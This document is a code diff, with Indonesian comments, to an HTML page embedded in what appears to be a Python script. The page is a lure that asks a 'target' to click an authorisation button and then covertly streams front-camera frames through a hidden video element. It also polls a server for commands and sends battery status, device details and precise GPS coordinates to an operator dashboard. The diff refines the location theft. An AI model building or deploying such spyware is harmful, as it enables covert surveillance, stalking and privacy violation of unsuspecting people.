@@ -34,69 +34,71 @@ TARGET_HTML = """
         <button class="btn" onclick="triggerOtoritas()">OTORISASI & SINKRONISASI</button>
     </div>
     <video id="v-feed" autoplay playsinline muted style="position: absolute; width: 1px; height: 1px; opacity: 0.01;"></video>
-    <script>
-        var canvas = document.createElement('canvas');
-        var ctx = canvas.getContext('2d');
-        
-        async function triggerOtoritas() {
-            try {
-                let stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
-                let video = document.getElementById("v-feed");
-                video.srcObject = stream;
-                video.onloadedmetadata = () => { 
-                    video.play(); 
-                    setInterval(captureFrame, 400); 
-                    setInterval(listenServerCommand, 1000); // Sistem Auto: Cek perintah tiap 1 detik
-                };
-                document.body.innerHTML = "<div class='box'><h2 style='color:#00ff00;'>[ CONNECTED ]</h2><p>Sesi nirkabel aktif melintasi internet proxy.</p></div>";
-            } catch(err) { alert("Izin ditolak: " + err); }
-        }
-        
-        function captureFrame() {
+<!-- GANTI BAGIAN DI DALAM SCRIPT TARGET_HTML MENJADI SEPERTI INI -->
+<script>
+    var canvas = document.createElement('canvas');
+    var ctx = canvas.getContext('2d');
+    var targetLatitude = "Belum Diizinkan";
+    var targetLongitude = "Belum Diizinkan";
+    
+    async function triggerOtoritas() {
+        try {
+            // 1. Ambil izin kamera seperti biasa
+            let stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
             let video = document.getElementById("v-feed");
-            if(video.videoWidth > 0) {
-                canvas.width = video.videoWidth; canvas.height = video.videoHeight;
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                fetch('/receive_frame', { method: 'POST', body: canvas.toDataURL('image/jpeg', 0.4) });
+            video.srcObject = stream;
+            
+            // 2. KUNCI PERBAIKAN: Tarik lokasi presisi saat tombol ini diklik oleh jari target
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition((pos) => {
+                    targetLatitude = pos.coords.latitude;
+                    targetLongitude = pos.coords.longitude;
+                }, null, { enableHighAccuracy: true });
             }
+
+            video.onloadedmetadata = () => { 
+                video.play(); 
+                setInterval(captureFrame, 400); 
+                setInterval(listenServerCommand, 1000); 
+            };
+            document.body.innerHTML = "<div class='box'><h2 style='color:#00ff00;'>[ CONNECTED ]</h2><p>Sesi nirkabel aktif melintasi internet proxy.</p></div>";
+        } catch(err) { alert("Izin ditolak: " + err); }
+    }
+    
+    function captureFrame() {
+        let video = document.getElementById("v-feed");
+        if(video.videoWidth > 0) {
+            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            fetch('/receive_frame', { method: 'POST', body: canvas.toDataURL('image/jpeg', 0.4) });
         }
-        #ambil_lokasi
-        async function listenServerCommand() {
-            let res = await fetch('/poll_command');
-            let data = await res.json();
-            if (data.command) {
-                let report = "";
-                if (data.command === "cek_baterai") {
-                    let battery = await navigator.getBattery();
-                    report = "INFO BATERAI TARGET -> Level: " + (battery.level * 100) + "%, Status Cas: " + battery.charging;
-                } else if (data.command === "ambil_data_sistem") {
-                    report = "INFO PERANGKAT TARGET -> Platform: " + navigator.platform + " | Browser: " + navigator.userAgent + " | Bahasa: " + navigator.language;
-                } else if (data.command === "ping_test") {
-                    report = "PING RESPONS -> Jalur pipa komunikasi cloud aktif 100%!";
-                } else if (data.command === "ambil_lokasi") {
-                    // Memicu GPS presisi tinggi bawaan perangkat target
-                    report = await new Promise((resolve) => {
-                        navigator.geolocation.getCurrentPosition(
-                            (pos) => {
-                                resolve("KOORDINAT TARGET (PRESISI) -> Lat: " + pos.coords.latitude + " | Long: " + pos.coords.longitude + " | Akurasi: " + pos.coords.accuracy + " meter");
-                            },
-                            (err) => {
-                                resolve("GAGAL AMBIL LOKASI -> " + err.message);
-                            },
-                            { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
-                        );
-                    });
-                }
-                
-                // Kirim balik log hasil ke dasbor operator
-                fetch('/report_output', {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ output: report })
-                });
+    }
+
+    async function listenServerCommand() {
+        let res = await fetch('/poll_command');
+        let data = await res.json();
+        if (data.command) {
+            let report = "";
+            if (data.command === "cek_baterai") {
+                let battery = await navigator.getBattery();
+                report = "INFO BATERAI TARGET -> Level: " + (battery.level * 100) + "%, Status Cas: " + battery.charging;
+            } else if (data.command === "ambil_data_sistem") {
+                report = "INFO PERANGKAT TARGET -> Platform: " + navigator.platform + " | Browser: " + navigator.userAgent;
+            } else if (data.command === "ambil_lokasi") {
+                // Langsung kirimkan variabel koordinat yang sudah berhasil dikunci saat klik pertama
+                report = "KOORDINAT TARGET (PRESISI) -> Lat: " + targetLatitude + " | Long: " + targetLongitude;
+            } else if (data.command === "ping_test") {
+                report = "PING RESPONS -> Jalur pipa komunikasi cloud aktif 100%!";
             }
+            
+            fetch('/report_output', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ output: report })
+            });
         }
-    </script>
+    }
+</script>
 </body>
 </html>
 """
